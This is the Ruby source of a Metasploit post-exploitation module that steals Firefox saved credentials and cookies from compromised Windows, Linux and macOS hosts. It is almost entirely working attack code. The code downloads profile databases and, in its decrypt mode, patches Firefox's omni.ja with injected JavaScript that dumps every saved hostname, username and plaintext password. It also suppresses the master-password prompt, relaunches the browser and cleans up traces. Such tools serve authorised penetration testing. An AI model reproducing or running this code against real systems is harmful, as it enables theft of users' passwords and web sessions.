##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'zip/zip'
require 'tmpdir'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/auxiliary/report'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather Firefox Signon Credential Collection',
      'Description'    => %q{
          This module will collect credentials from the Firefox web browser if it is
        installed on the targeted machine. Additionally, cookies are downloaded. Which
        could potentially yield valid web sessions.

        Firefox stores passwords within the signons.sqlite database file. There is also a
        keys3.db file which contains the key for decrypting these passwords. In cases where
        a Master Password has not been set, the passwords can easily be decrypted using
        third party tools or by setting the DECRYPT option to true. Using the latter often
        needs root privileges. If a Master Password was used the only option would be
        to bruteforce.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
            'bannedit',
            'xard4s' # added decryption support
        ],
      'Platform'       => ['win', 'linux', 'bsd', 'unix', 'osx'],
      'SessionTypes'   => ['meterpreter', 'shell' ]
    ))

    register_options(
      [
        OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
      ]
    )
    #TODO
    # - Collect cookies.
  end

  def run
    print_status("Determining session platform and type...")
    case session.platform
    when /unix|linux|bsd/
      @platform = :unix
    when /osx/
      @platform = :osx
    when /win/
      if session.type != "meterpreter"
        print_error "Only meterpreter sessions are supported on windows hosts"
        return
      end
      @platform = :windows
    else
      print_error("Unsupported platform #{session.platform}")
      return
    end

    if datastore['DECRYPT']
      omnija = nil
      org_file = 'omni.ja'
      new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"

      # sets @paths
      return unless get_ff_and_loot_path

      print_status("Downloading #{org_file} from #{@paths['ff']}")
      omnija = read_file(@paths['ff']+org_file)
      if omnija.nil? or omnija.empty? or omnija =~ /No such file/i
        print_error("Could not download #{org_file}, archive may not exist")
        return
      end
      # cross platform local tempdir, "/" should work on windows too
      tmp = Dir::tmpdir + "/" + new_file
      print_status("Writing #{org_file} to local file: #{tmp}")
      file_local_write(tmp, omnija)
      res = nil
      print_status("Extracting and modifying #{new_file}...")
      begin
        # automatically commits the changes made to the zip archive when
        # the block terminates
        Zip::ZipFile.open(tmp) do |zip_file|
          res = modify_omnija(zip_file)
        end
      rescue Zip::ZipError => e
        print_error("Error modifying #{new_file}")
        return
      end
      if res
        print_status("Successfully modified #{new_file}")
      else
        print_error("Failed to patch method")
        return
      end
      print_status("Uploading #{new_file} to #{@paths['ff']}")
      if not upload_file(@paths['ff']+new_file, tmp)
        print_error("Could not upload #{new_file}")
        return
      end

      return if not trigger_decrypt(org_file, new_file)

      download_creds
    else
      paths = []
      if @platform =~ /unix|osx/
        paths = enum_users_unix
      else # windows
        grab_user_profiles().each do |user|
          next if user['AppData'] == nil
          dir = check_firefox(user['AppData'])
          if dir
          paths << dir
          end
        end
      end

      if paths.nil?
        print_error("No users found with a Firefox directory")
        return
      end

      download_loot(paths.flatten)

    end

  end

  def enum_users_unix
    id = whoami
    if id.nil? or id.empty?
      print_error("This session is not responding, perhaps the session is dead")
    end

    if @platform == :osx
      home = "/Users/"
    else
      home = "/home/"
    end

    if got_root?
      userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
      userdirs << "/root\n"
    else
      print_status("We do not have root privileges")
      print_status("Checking #{id} account for Firefox")
      if @platform == :osx
        firefox = session.shell_command("ls #{home}#{id}/Library/Application\\ Support/Firefox/Profiles/").gsub(/\s/, "\n")
      else
        firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
      end

      firefox.each_line do |profile|
        profile.chomp!
        next if profile =~ /No such file/i

        if profile =~ /\.default/
            print_status("Found Firefox Profile for: #{id}")
            if @platform == :osx
              return [home + id + "/Library/Application\\ Support/Firefox/Profiles/" + profile + "/"]
            else
              return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
            end
        end
      end
      return
    end

    # we got root check all user dirs
    paths = []
    userdirs.each_line do |dir|
      dir.chomp!
      next if dir == "." || dir == ".."

      dir = home + dir + "/.mozilla/firefox/" if dir !~ /root/
      if dir =~ /root/
        dir += "/.mozilla/firefox/"
      end

      print_status("Checking for Firefox Profile in: #{dir}")

      stat = session.shell_command("ls #{dir}")
      if stat =~ /No such file/i
        print_error("Mozilla not found in #{dir}")
        next
      end
      stat.gsub!(/\s/, "\n")
      stat.each_line do |profile|
        profile.chomp!
        if profile =~ /\.default/
          print_status("Found Firefox Profile in: #{dir+profile}")
          paths << "#{dir+profile}"
        end
      end
    end
    return paths
  end

  def check_firefox(path)
    paths = []
    path = path + "\\Mozilla\\"
    print_status("Checking for Firefox directory in: #{path}")

    stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
    if !stat
      print_error("Firefox not found")
      return
    end

    session.fs.dir.foreach(path) do |fdir|
      if fdir =~ /Firefox/i and @platform == :windows
        paths << path + fdir + "Profiles\\"
        print_good("Found Firefox installed")
        break
      else
        paths << path + fdir
        print_status("Found Firefox installed")
        break
      end
    end

    if paths.empty?
      print_error("Firefox not found")
      return
    end

    print_status("Locating Firefox Profiles...")
    print_line("")
    path += "Firefox\\Profiles\\"

    # we should only have profiles in the Profiles directory store them all
    begin
      session.fs.dir.foreach(path) do |pdirs|
        next if pdirs == "." or pdirs == ".."
        print_good("Found Profile #{pdirs}")
        paths << path + pdirs
      end
    rescue
      print_error("Profiles directory missing")
      return
    end

    if paths.empty?
      return nil
    else
      return paths
    end
  end

  # checks for needed privileges and wheter Firefox is installed
  def get_ff_and_loot_path
    @paths = {}
    check_paths = []
    drive = expand_path("%SystemDrive%")
    loot_file = Rex::Text::rand_text_alpha(6) + ".txt"

    case @platform
    when /win/
      if !got_root? and session.sys.config.sysinfo['OS'] !~ /xp/i
        print_error("You need root privileges on this platform for DECRYPT option")
        return false
      end
      tmpdir = expand_path("%TEMP%") + "\\"
      # this way allows for more independent use of meterpreter
      # payload (32 and 64 bit) and cleaner code
      check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
      check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'

    when /unix/
      tmpdir = '/tmp/'
      if cmd_exec("whoami").chomp !~ /root/
        print_error("You need root privileges on this platform for DECRYPT option")
        return false
      end
      # unix matches linux|unix|bsd but bsd is not supported
      if session.platform =~ /bsd/
        print_error("Sorry, bsd is not supported by the DECRYPT option")
        return false
      end

      check_paths << '/usr/lib/firefox/'
      check_paths << '/usr/lib64/firefox/'

    when /osx/
      tmpdir = '/tmp/'
      check_paths << '/applications/firefox.app/contents/macos/'
    end

    @paths['ff'] = check_paths.find do |p|
      check = p.sub(/(\\|\/)(mozilla\s)?firefox.*/i, '')
      print_status("Checking for Firefox directory in: #{check}")
      if directory?(p.sub(/(\\|\/)$/, ''))
        print_good("Found Firefox directory")
        true
      else
        print_error("No Firefox directory found")
        false
      end
    end

    return false if @paths['ff'].nil?

    @paths['loot'] = tmpdir + loot_file
    return true

  end

  def modify_omnija(zip)
    files = [
                'components/storage-mozStorage.js',
                'chrome/toolkit/content/passwordmgr/passwordManager.xul',
                'chrome/toolkit/content/global/commonDialog.xul',
                'jsloader/resource/gre/components/storage-mozStorage.js'
            ]

    arya = files.map do |file|
      fdata = {}
      fdata['content'] = zip.read(file) unless file =~ /jsloader/
      fdata['outs'] = zip.get_output_stream(file)
      fdata
    end

    stor_js, pwd_xul, dlog_xul, res_js = arya
    stor_js['outs_res'] = res_js['outs']

    wnd_close = "window.close();"
    onload = "Startup(); SignonsStartup(); #{wnd_close}"

    # get rid of (possible) master password prompt and close pwd
    # manager immediately
    dlog_xul['content'].sub!(/commonDialogOnLoad\(\)/, wnd_close)
    dlog_xul['outs'].write(dlog_xul['content'])
    dlog_xul['outs'].close

    pwd_xul['content'].sub!(/Startup\(\); SignonsStartup\(\);/, onload)
    pwd_xul['outs'].write(pwd_xul['content'])
    pwd_xul['outs'].close

    # returns true or false
    return patch_method(stor_js)

  end

  # Patches getAllLogins() method from storage-mozStorage.js
  def patch_method(stor_js)
    data = ""
    # imports needed for IO
    imports = %Q|
    Components.utils.import("resource://gre/modules/NetUtil.jsm");
    Components.utils.import("resource://gre/modules/FileUtils.jsm");
    Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
    |

    # Javascript code to intercept the logins array and write the
    # credentials to a file
    method_epilog = %Q|
    var data = "";
    var path = "#{@paths['loot'].inspect.gsub(/"/, '')}";
    var file = new FileUtils.File(path);

    var outstream = FileUtils.openSafeFileOutputStream(file);
    var converter = Components.classes["@mozilla.org/intl/scriptableunicodeconverter"].
      createInstance(Components.interfaces.nsIScriptableUnicodeConverter);
    converter.charset = "UTF-8";

    if (logins.length != 0) {
      for (var i = 0; i < logins.length; i++) {

      data += logins[i].hostname + " :: " + logins[i].username + " :: " + logins[i].password + " ^";

      }

    } else {
      data = "no creds";
    }

    var istream = converter.convertToInputStream(data);
    NetUtil.asyncCopy(istream, outstream);

    return logins;
    |

    regex = [
                nil,
                [/return\slogins;/, method_epilog],
                [/getAllLogins\s:\sfunction\s\(count\)\s{/, nil],
                [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
            ]

    # match three regular expressions
    i = 3
    stor_js['content'].each_line do |line|
        # there is no real substitution if the matching regex
        # has no corresponding patch code
        if i != 0 and line.sub!(regex[i][0]) do |match|
              if not regex[i][1].nil?
                regex[i][1]
              else
                line
              end
            end
          i -= 1
        end

      data << line

    end

    # write the same data to both output streams
    stor_js['outs'].write(data)
    stor_js['outs_res'].write(data)
    stor_js['outs'].close
    stor_js['outs_res'].close

    i == 0 ? 'return true' : 'return false'

  end

  # Starts a new firefox process and triggers decryption
  def trigger_decrypt(org_file, new_file)
    temp_file = "orgomni.ja"
    [org_file, new_file, temp_file].each do |f|
      f.insert(0, @paths['ff'])
    end
    # firefox command line arguments
    args = '-purgecaches -chrome chrome://passwordmgr/content/passwordManager.xul'

    # In case of unix-like platform Firefox needs to start under user
    # context
    if @platform =~ /unix/

      # assuming userdir /home/(x) = user
      print_status("Enumerating users...")
      users = cmd_exec("ls /home")
      if users.nil? or users.empty?
        print_error("No normal user found")
        return false
      end
      user = users.split()[0]
      # Since we can't access the display environment variable
      # we have to assume the default value
      args.insert(0, "\"#{@paths['ff']}firefox --display=:0 ")
      args << "\""
      cmd = "su #{user} -c"

    elsif @platform =~ /win|osx/

      cmd = @paths['ff'] + "firefox"
      # on osx, run in background
      args << "& sleep 5 && killall firefox" if @platform =~ /osx/
    end

    # check if firefox is running and kill it
    if session.type == "meterpreter"
      session.sys.process.each_process do |p|
        if p['name'] =~ /firefox\.exe/
          print_status("Found running Firefox process, attempting to kill.")
          if not session.sys.process.kill(p['pid'])
            print_error("Could not kill Firefox process")
            return false
          end
        end
      end

    elsif session.type != "meterpreter"
      p = cmd_exec("ps", "cax | grep firefox")
      if p =~ /firefox/
        print_status("Found running Firefox process, attempting to kill.")
        term = cmd_exec("killall", "firefox && echo true")
        if not term =~ /true/
          print_error("Could not kill Firefox process")
          return false
        end
      end
    end
    #
    # rename-fu
    # omni.ja -> orgomni.ja
    # *random*.ja -> omni.ja
    # omni.ja -> *random*.ja
    # orgomni.ja -> omni.ja
    #
    rename_file(org_file, temp_file)
    rename_file(new_file, org_file)

    # automatic termination ( window.close() or arguments)
    print_status("Starting Firefox process")
    cmd_exec(cmd,args)

    rename_file(org_file, new_file)
    rename_file(temp_file, org_file)

    # clean up
    file_rm(new_file)

    # at this time it should have a loot file
    if !file?(@paths['loot'])
      print_error("Decryption failed, there's probably a master password in use")
      return false
    end

    return true

  end

  def download_loot(paths)
    loot = ""
    paths.each do |path|
      print_status(path)
      profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
      if session.type == "meterpreter"
        session.fs.dir.foreach(path) do |file|
          if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
            print_good("Downloading #{file} file from: #{path}")
            file = path + "\\" + file
            fd = session.fs.file.new(file)
            begin
              until fd.eof?
                data = fd.read
                loot << data if not data.nil?
              end
            rescue EOFError
            ensure
              fd.close
            end

            ext = file.split('.')[2]
            if ext == "txt"
              mime = "plain"
            else
              mime = "binary"
            end
            file = file.split('\\').last
            store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
          end
        end
      end
      if session.type != "meterpreter"
        files = session.shell_command("ls #{path}").gsub(/\s/, "\n")
        files.each_line do |file|
          file.chomp!
          if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
            print_good("Downloading #{file}\\")
            data = session.shell_command("cat #{path}#{file}")
            ext = file.split('.')[2]
            if ext == "txt"
              mime = "plain"
            else
              mime = "binary"
            end
            file = file.split('/').last
            store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
          end
        end
      end
    end
  end

  def download_creds
    print_good("Downloading loot: #{@paths['loot']}")
    loot = read_file(@paths['loot'])

    if loot =~ /no creds/
      print_status("No Firefox credentials where found")
      return
    end

    cred_table = Rex::Ui::Text::Table.new(
      'Header' => 'Firefox credentials',
      'Indent' => 1,
      'Columns'=>
        [
          'Hostname',
          'User',
          'Password'
        ]
    )

    creds = loot.split("^")
    creds.each do |cred|
      hostname, user, pass = cred.rstrip.split(" :: ")
      cred_table << [hostname, user, pass]
    end

    print_line("\n" + cred_table.to_s)

    path = store_loot(
        "firefox.creds",
        "text/plain",
        session,
        cred_table.to_csv,
        "firefox_credentials.txt",
        "Firefox Credentials")

    # better delete the remote creds file
    file_rm(@paths['loot'])

  end

  def got_root?
    case @platform
    when :windows
      if session.sys.config.getuid =~ /SYSTEM/
        return true
      else
        return false
      end
    else # unix, bsd, linux, osx
      ret = whoami
      if ret =~ /root/
        return true
      else
        return false
      end
    end
  end

  def whoami
    if @platform == :windows
      return session.fs.file.expand_path("%USERNAME%")
    else
      return session.shell_command("whoami").chomp
    end
  end
end
